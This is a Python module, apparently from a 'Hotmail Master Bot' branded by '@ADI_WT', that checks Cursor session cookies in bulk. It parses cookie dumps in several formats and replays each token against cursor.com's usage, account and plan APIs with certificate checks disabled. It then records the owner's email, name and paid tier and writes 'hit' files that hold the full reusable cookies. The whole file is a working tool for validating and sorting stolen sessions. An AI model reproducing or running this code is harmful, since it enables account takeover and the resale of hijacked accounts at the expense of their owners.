"""
Cursor Cookie Checker Engine
Based on cursor.py logic | Integrated into Hotmail Master Bot
"""
import os
import json
import base64
import re
import requests
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Tuple, Optional


# ════ CURSOR COOKIE KEYS ════
CURSOR_COOKIES = ["WorkosCursorSessionToken", "cursor_session", "__client"]


# ════ JWT DECODER ════
def decode_jwt(token: str) -> Optional[dict]:
    """Decode JWT payload without verification"""
    try:
        token = token.strip()
        if not token or '.' not in token or len(token) < 50:
            return None
        parts = token.split('.')
        if len(parts) < 3:
            return None
        payload = parts[1] + '=' * (4 - len(parts[1]) % 4)
        decoded = base64.urlsafe_b64decode(payload)
        return json.loads(decoded)
    except:
        return None


# ════ COOKIE PARSER ════
def _parse_cookies_from_text(text: str) -> Dict[str, str]:
    """Parse cookies from text (Netscape/JSON/Header/JWT)"""
    text = text.strip()
    if not text:
        return {}

    # Try JSON first
    try:
        if text.startswith('[') or text.startswith('{'):
            data = json.loads(text)
            if isinstance(data, list):
                cookies = {}
                for item in data:
                    if isinstance(item, dict):
                        name = item.get("name", item.get("Name", ""))
                        value = item.get("value", item.get("Value", ""))
                        if name and value is not None:
                            cookies[str(name)] = str(value)
                return cookies
            elif isinstance(data, dict):
                return {str(k): str(v) for k, v in data.items()}
    except:
        pass

    # Netscape format
    cookies = {}
    for line in text.split('\n'):
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            name = parts[5].strip()
            value = parts[6].strip()
            if name:
                cookies[name] = value
            continue
        # key=value pairs
        if '=' in line and not line.startswith('http'):
            kv = line.split('=', 1)
            if len(kv) == 2:
                name = kv[0].strip().strip('"')
                value = kv[1].strip().strip(';').strip('"')
                if name and len(name) > 1 and not name.startswith('.'):
                    cookies[name] = value
    return cookies


def parse_cursor_cookies(content: str) -> list:
    """Parse multi-format Cursor cookies from content"""
    found = []
    lines = content.strip().splitlines()

    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue

        # Netscape format
        if '\t' in line:
            parts = line.split('\t')
            if len(parts) >= 7:
                name = parts[5]
                value = parts[6].strip()
                if name in CURSOR_COOKIES and value:
                    found.append({name: value})
            continue

        # JSON object
        if line.startswith('{'):
            try:
                data = json.loads(line)
                if isinstance(data, dict):
                    ck = {k: v for k, v in data.items() if k in CURSOR_COOKIES}
                    if ck:
                        found.append(ck)
            except:
                pass
            continue

        # key=value pairs (cookie header style)
        if '=' in line and not line.startswith('http') and ';' in line:
            cookies = {}
            for pair in line.split(';'):
                if '=' in pair:
                    k, _, v = pair.strip().partition('=')
                    k = k.strip(); v = v.strip()
                    if k in CURSOR_COOKIES and v:
                        cookies[k] = v
            if cookies:
                found.append(cookies)
            continue

        # Raw JWT token (single line)
        if line.count('.') == 2 and len(line) > 50:
            found.append({"WorkosCursorSessionToken": line})
            continue

    return found


# ════ VALIDATION ════
def is_valid_cursor(d: dict) -> bool:
    """Check if cookies contain Cursor session keys"""
    return any(k in d for k in CURSOR_COOKIES)


def count_valid_cursor(files: List[Tuple[str, str]]) -> Tuple[int, List[Tuple[str, dict]]]:
    """Count and extract valid Cursor cookies from files"""
    result = []
    for src, text in files:
        # First try standard parser
        d = _parse_cookies_from_text(text)
        if is_valid_cursor(d):
            result.append((src, d))
            continue
        # Try Cursor-specific parser
        parsed = parse_cursor_cookies(text)
        for ck in parsed:
            if ck:
                result.append((src, ck))
    return len(result), result


# ════ CHECKER ════
def check_cursor_cookie(cookies_dict: dict, proxies_list: List[str] = None) -> Tuple[Optional[dict], str]:
    """Check Cursor cookie via REAL API (api/usage + api/auth/me)."""
    try:
        token = (
            cookies_dict.get('WorkosCursorSessionToken') or
            cookies_dict.get('cursor_session') or
            cookies_dict.get('__client') or ''
        )
        if not token or len(token) < 20:
            return None, 'invalid'

        session = requests.Session()
        for k, v in cookies_dict.items():
            session.cookies.set(k, v, domain=".cursor.com", path="/")
            session.cookies.set(k, v, domain="cursor.com", path="/")

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json',
        }

        # Step 1: usage API — real auth gate (401 = dead session)
        try:
            ru = session.get('https://cursor.com/api/usage', headers=headers, timeout=(5, 10), verify=False)
        except Exception:
            return None, 'error'

        if ru.status_code in (401, 403):
            return None, 'expired'
        if ru.status_code != 200:
            return None, 'error'

        usage = {}
        try:
            usage = ru.json()
        except Exception:
            pass

        # Step 2: auth/me for email/name
        email, name = 'N/A', 'N/A'
        try:
            rm = session.get('https://cursor.com/api/auth/me', headers=headers, timeout=(5, 10), verify=False)
            if rm.status_code == 200:
                me = rm.json()
                email = me.get('email', me.get('user', {}).get('email', 'N/A'))
                name = me.get('name', me.get('user', {}).get('name', 'N/A'))
        except Exception:
            pass

        # Fallback: try to get email from JWT (info only)
        if email == 'N/A':
            jwt = decode_jwt(token)
            if jwt:
                email = jwt.get('email', jwt.get('sub', 'N/A'))
                name = jwt.get('name', 'N/A')

        # Step 2.5: dedicated plan API (planName — most accurate)
        plan_api_name = ''
        try:
            pr = session.post('https://cursor.com/api/dashboard/get-plan-info',
                              json={}, headers=headers, timeout=(5, 12), verify=False)
            if pr.status_code == 200:
                pd = pr.json()
                plan_api_name = str(pd.get('planName') or pd.get('plan') or pd.get('membershipType')
                                     or pd.get('subscriptionPlan') or pd.get('tier') or '')
                if isinstance(pd.get('subscription'), dict):
                    plan_api_name = plan_api_name or str(pd['subscription'].get('planName')
                                       or pd['subscription'].get('plan') or '')
        except Exception:
            pass

        # Step 3: plan detection from REAL usage response
        membership = str(usage.get('membershipType', '')).lower()
        team = str(usage.get('teamType', '')).lower()

        pro_kw = ('pro', 'business', 'enterprise', 'team', 'ultra')
        is_pro = membership in pro_kw or team in pro_kw
        if plan_api_name:
            tier = plan_api_name.upper()
            is_pro = plan_api_name.lower() not in ('free', '')
        elif membership:
            tier = membership.upper()
        elif team:
            tier = team.upper()
        else:
            # Fallback: premium quota se infer — Pro pe high/premium limits hote hain
            tier = 'FREE'
            is_pro = False
            try:
                premium_quota_hit = False
                for _k, _v in usage.items():
                    if not isinstance(_v, dict):
                        continue
                    _lim = _v.get('maxRequestUsage') or _v.get('limit') or _v.get('max')
                    if isinstance(_lim, (int, float)) and _lim >= 500:
                        premium_quota_hit = True
                        break
                    if _v.get('unlimited') is True:
                        premium_quota_hit = True
                        break
                if premium_quota_hit:
                    tier = 'PRO (quota)'
                    is_pro = True
            except Exception:
                pass

        plan_label = 'Pro' if is_pro else 'Free'

        return {
            'email': email,
            'name': name,
            'plan': plan_label,
            'tier': tier,
            'is_pro': is_pro,
            'is_free': not is_pro,
            'expiry': 'N/A',
            'details': f'API verified | membership: {tier}',
            'token_preview': token[:40] + '...',
            'jwt_data': {'membershipType': tier, 'verified': 'cursor.com/api/usage'}
        }, 'valid'

    except:
        return None, 'error'


# ════ FORMATTER ════
def _netscape_cursor(d: dict) -> str:
    """Generate Netscape format cookies for Cursor"""
    lines = ["# Netscape HTTP Cookie File", "# Cursor Cookies - WHITE Checker | Owner: @ADI_WT", ""]
    for name, value in d.items():
        secure = "TRUE" if name.startswith("__") else "FALSE"
        lines.append(f".cursor.sh\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
        lines.append(f".cursor.com\tTRUE\t/\t{secure}\t0\t{name}\t{value}")
    return "\n".join(lines)


def format_hit_cursor(result: dict, cookies_dict: dict, source: str) -> Tuple[str, str]:
    """Format Cursor hit output"""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    netscape = _netscape_cursor(cookies_dict)

    jwt_info = ""
    if result.get('jwt_data'):
        jwt_info = json.dumps(result['jwt_data'], indent=2, ensure_ascii=False)

    content = f"""════════════════════════════════════════════════════════
  WHITE Cursor Cookie Checker  |  Owner: @ADI_WT
════════════════════════════════════════════════════════

  Checked At : {ts}
  Source     : {source}

════════════════════════════════════════════════════════
  ACCOUNT INFO
════════════════════════════════════════════════════════

  Name       : {result.get('name', 'N/A')}
  Email      : {result.get('email', 'N/A')}
  Plan       : {result.get('plan', 'N/A')}
  Tier       : {result.get('tier', 'N/A')}
  Premium    : {'Yes' if result.get('is_pro') else 'No'}
  Expiry     : {result.get('expiry', 'N/A')}
  Details    : {result.get('details', 'N/A')}
  Token      : {result.get('token_preview', 'N/A')}

════════════════════════════════════════════════════════
  JWT DATA
════════════════════════════════════════════════════════
{jwt_info}

════════════════════════════════════════════════════════
  COOKIES (Netscape Format)
════════════════════════════════════════════════════════
{netscape}

════════════════════════════════════════════════════════
  RAW COOKIES (JSON)
════════════════════════════════════════════════════════
{json.dumps(cookies_dict, indent=2, ensure_ascii=False)}

════════════════════════════════════════════════════════
  Owner: @ADI_WT | WHITE Cursor Cookie Checker
════════════════════════════════════════════════════════
"""
    safe_plan = re.sub(r'[<>:"/\|?*\s]', '_', result.get("plan", "unknown").lower())
    safe_email = re.sub(r'[<>:"/\|?*\s]', '_', result.get("email", "unknown"))
    filename = f"[cursor_{safe_plan}][{safe_email}].txt"
    return content, filename
